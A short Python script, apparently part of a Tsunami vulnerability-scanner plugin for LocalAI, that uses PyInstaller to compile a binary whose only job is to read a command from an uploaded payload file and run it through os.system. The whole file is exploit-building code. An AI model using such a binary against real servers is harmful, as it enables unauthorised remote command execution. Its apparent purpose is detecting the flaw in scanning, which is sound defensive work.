import tempfile
import PyInstaller.__main__


# Builds exploit code
def build():
  code = (
      # Python code we want to run
      "import os;"
      ' os.system(open("/tmp/localai/upload/tsunamiPayload.txt").read().strip())'
  )
  appname = "app.bin"
  with tempfile.NamedTemporaryFile(delete=False) as fp:
    fp.write(code.encode())
    fp.close()
    PyInstaller.__main__.run([
        "--onefile",
        "--clean",
        "--workpath",
        "/tmp/build/",
        "--specpath",
        "/tmp",
        "--distpath",
        ".",
        "-n",
        appname,
        fp.name,
    ])


if __name__ == "__main__":
  build()
